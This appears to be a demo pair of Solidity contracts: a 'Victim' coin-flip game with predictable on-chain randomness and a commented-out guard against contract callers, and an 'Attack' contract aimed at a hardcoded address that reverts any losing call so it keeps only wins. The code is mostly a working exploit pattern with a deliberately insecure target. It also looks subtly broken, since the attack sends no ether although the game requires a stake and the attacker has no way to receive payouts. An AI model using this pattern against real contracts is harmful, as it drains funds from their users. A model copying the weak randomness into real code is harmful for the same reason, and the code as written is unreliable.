pragma solidity ^0.5.0;

contract Attack {
    address victimAddr = 0xB23e0BFaEedCFCE82Ea2011f2A2726584e611e57;
    Victim victim = Victim(victimAddr);

    function attack() public {
        uint256 previousvalue = address(this).balance;
        victim.draw();
        if (address(this).balance < previousvalue) {
        revert();
       }
    }
}

interface Victim{
    function draw() external payable;
}
 
pragma solidity ^0.5.0;
contract Victim {

    uint nonce = 0;

    function draw() public payable {
    // require(isContract(msg.sender) == false, "can not be contract");
        require(msg.value == 0.01 ether, "require value");
        if (isWin()) {
            msg.sender.transfer(0.02 ether);
        }
    }

    function isWin() private view returns(bool) {
        return uint(keccak256(abi.encodePacked(now, msg.sender, nonce)))%2 == 1;
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }
}
